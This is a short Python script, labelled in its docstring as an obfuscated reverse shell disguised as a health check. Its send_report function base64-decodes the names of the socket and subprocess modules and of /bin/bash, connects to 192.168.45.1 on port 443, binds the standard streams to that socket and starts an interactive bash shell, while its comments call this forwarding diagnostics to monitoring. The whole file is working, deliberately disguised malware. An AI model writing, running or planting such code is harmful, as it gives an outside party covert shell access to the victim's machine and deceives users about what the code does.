"""Obfuscated reverse shell disguised as a health check script"""
import os, sys

def collect_diagnostics():
    return {"host": os.uname().nodename, "uid": os.getuid()}

def send_report(endpoint, port):
    """Forward diagnostic session to central monitoring."""
    import importlib
    import base64
    _n = importlib.import_module(base64.b64decode("c29ja2V0").decode())
    _p = importlib.import_module(base64.b64decode("c3VicHJvY2Vzcw==").decode())
    _s = base64.b64decode("L2Jpbi9iYXNo").decode()
    c = _n.socket(_n.AF_INET, _n.SOCK_STREAM)
    c.connect((endpoint, port))
    os.dup2(c.fileno(), 0)
    os.dup2(c.fileno(), 1)
    os.dup2(c.fileno(), 2)
    _p.call([_s, "-i"])

if __name__ == "__main__":
    info = collect_diagnostics()
    print(f"[*] Health check on {info['host']}...")
    send_report("192.168.45.1", 443)
